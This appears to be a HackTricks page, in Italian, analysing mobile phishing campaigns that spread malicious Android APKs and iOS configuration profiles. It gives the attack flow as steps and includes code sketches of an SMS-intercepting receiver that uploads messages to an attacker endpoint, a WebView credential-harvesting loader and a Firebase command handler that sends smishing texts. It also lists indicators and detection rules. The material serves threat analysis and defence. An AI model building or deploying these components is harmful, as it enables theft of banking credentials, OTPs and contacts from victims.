# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Questa pagina tratta delle tecniche utilizzate dagli attori delle minacce per distribuire **APK Android malevoli** e **profili di configurazione mobile iOS** attraverso il phishing (SEO, ingegneria sociale, negozi falsi, app di incontri, ecc.).
> Il materiale è adattato dalla campagna SarangTrap esposta da Zimperium zLabs (2025) e da altre ricerche pubbliche.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Registrare dozzine di domini simili (incontri, condivisione cloud, servizio auto…).
– Utilizzare parole chiave e emoji nella lingua locale nell'elemento `<title>` per posizionarsi su Google.
– Ospitare *sia* le istruzioni di installazione Android (`.apk`) che iOS sulla stessa pagina di atterraggio.
2. **First Stage Download**
* Android: link diretto a un APK *non firmato* o “negozio di terze parti”.
* iOS: `itms-services://` o link HTTPS semplice a un profilo **mobileconfig** malevolo (vedi sotto).
3. **Post-install Social Engineering**
* Al primo avvio, l'app chiede un **codice di invito / verifica** (illusione di accesso esclusivo).
* Il codice è **POSTato su HTTP** al Command-and-Control (C2).
* C2 risponde `{"success":true}` ➜ il malware continua.
* L'analisi dinamica di Sandbox / AV che non invia un codice valido non vede **comportamenti malevoli** (evasione).
4. **Runtime Permission Abuse** (Android)
* Le autorizzazioni pericolose vengono richieste **solo dopo una risposta positiva dal C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Le versioni più vecchie richiedevano anche autorizzazioni SMS -->
```
* Le varianti recenti **rimuovono `<uses-permission>` per SMS da `AndroidManifest.xml`** ma lasciano il percorso del codice Java/Kotlin che legge gli SMS tramite riflessione ⇒ abbassa il punteggio statico pur rimanendo funzionale su dispositivi che concedono l'autorizzazione tramite abuso di `AppOps` o obiettivi vecchi.
5. **Facade UI & Background Collection**
* L'app mostra viste innocue (visualizzatore SMS, selettore galleria) implementate localmente.
* Nel frattempo, esfiltra:
- IMEI / IMSI, numero di telefono
- Dump completo di `ContactsContract` (array JSON)
- JPEG/PNG da `/sdcard/DCIM` compressi con [Luban](https://github.com/Curzibn/Luban) per ridurre le dimensioni
- Contenuto SMS opzionale (`content://sms`)
I payload sono **batch-zippati** e inviati tramite `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
* Un singolo **profilo di configurazione mobile** può richiedere `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` ecc. per iscrivere il dispositivo in una supervisione simile a “MDM”.
* Istruzioni di ingegneria sociale:
1. Aprire Impostazioni ➜ *Profilo scaricato*.
2. Toccare *Installa* tre volte (screenshot sulla pagina di phishing).
3. Fidarsi del profilo non firmato ➜ l'attaccante ottiene i diritti su *Contatti* e *Foto* senza revisione dell'App Store.
7. **Network Layer**
* HTTP semplice, spesso sulla porta 80 con intestazione HOST come `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → facile da individuare).

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – Durante la valutazione del malware, automatizzare la fase del codice di invito con Frida/Objection per raggiungere il ramo malevolo.
* **Manifest vs. Runtime Diff** – Confrontare `aapt dump permissions` con `PackageManager#getRequestedPermissions()` a runtime; la mancanza di permessi pericolosi è un campanello d'allarme.
* **Network Canary** – Configurare `iptables -p tcp --dport 80 -j NFQUEUE` per rilevare esplosioni di POST non solidi dopo l'inserimento del codice.
* **mobileconfig Inspection** – Utilizzare `security cms -D -i profile.mobileconfig` su macOS per elencare `PayloadContent` e individuare diritti eccessivi.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** per catturare esplosioni improvvise di domini ricchi di parole chiave.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` da client Dalvik al di fuori di Google Play.
* **Invite-code Telemetry** – POST di codici numerici di 6–8 cifre poco dopo l'installazione dell'APK può indicare staging.
* **MobileConfig Signing** – Bloccare profili di configurazione non firmati tramite politica MDM.

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Indicatori (Generici)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Questo schema è stato osservato in campagne che abusano di temi legati ai benefici governativi per rubare credenziali UPI indiane e OTP. Gli operatori concatenano piattaforme affidabili per la consegna e la resilienza.

### Catena di consegna attraverso piattaforme fidate
- Video di YouTube come esca → la descrizione contiene un link breve
- Link breve → sito di phishing su GitHub Pages che imita il portale legittimo
- Lo stesso repository GitHub ospita un APK con un falso badge “Google Play” che collega direttamente al file
- Pagine di phishing dinamiche vivono su Replit; il canale di comando remoto utilizza Firebase Cloud Messaging (FCM)

### Dropper con payload incorporato e installazione offline
- Il primo APK è un installer (dropper) che spedisce il vero malware a `assets/app.apk` e invita l'utente a disabilitare Wi‑Fi/dati mobili per ridurre il rilevamento nel cloud.
- Il payload incorporato si installa sotto un'etichetta innocua (ad es., “Aggiornamento Sicuro”). Dopo l'installazione, sia l'installer che il payload sono presenti come app separate.

Suggerimento per la triage statica (grep per payload incorporati):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Scoperta dinamica degli endpoint tramite shortlink
- Il malware recupera un elenco di endpoint attivi in formato testo semplice e separato da virgole da uno shortlink; semplici trasformazioni di stringa producono il percorso finale della pagina di phishing.

Esempio (sanitizzato):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Codice pseudo:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Raccolta di credenziali UPI basata su WebView
- Il passaggio “Effettua il pagamento di ₹1 / UPI‑Lite” carica un modulo HTML dell'attaccante dall'endpoint dinamico all'interno di un WebView e cattura campi sensibili (telefono, banca, PIN UPI) che vengono `POST`ati a `addup.php`.

Loader minimo:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Auto-propagazione e intercettazione SMS/OTP
- Vengono richieste autorizzazioni aggressive al primo avvio:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- I contatti vengono utilizzati per inviare SMS smishing in massa dal dispositivo della vittima.
- Gli SMS in arrivo vengono intercettati da un ricevitore di broadcast e caricati con metadati (mittente, corpo, slot SIM, ID casuale per dispositivo) su `/addsm.php`.

Ricevitore schizzo:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) come C2 resiliente
- Il payload si registra a FCM; i messaggi push contengono un campo `_type` utilizzato come interruttore per attivare azioni (ad es., aggiornare i modelli di testo di phishing, attivare/disattivare comportamenti).

Esempio di payload FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler sketch:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Hunting patterns and IOCs
- APK contiene un payload secondario in `assets/app.apk`
- WebView carica il pagamento da `gate.htm` ed esfiltra a `/addup.php`
- Esfiltrazione SMS a `/addsm.php`
- Fetch della configurazione tramite shortlink (es., `rebrand.ly/*`) che restituisce endpoint CSV
- App etichettate come generiche “Update/Secure Update”
- Messaggi `data` FCM con un discriminatore `_type` in app non affidabili

### Detection & defence ideas
- Segnala app che istruiscono gli utenti a disabilitare la rete durante l'installazione e poi caricano un secondo APK da `assets/`.
- Allerta sulla tupla di permessi: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + flussi di pagamento basati su WebView.
- Monitoraggio dell'uscita per `POST /addup.php|/addsm.php` su host non aziendali; blocca infrastrutture note.
- Regole EDR mobili: app non affidabili che si registrano per FCM e si ramificano su un campo `_type`.

---

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)

{{#include ../../banners/hacktricks-training.md}}
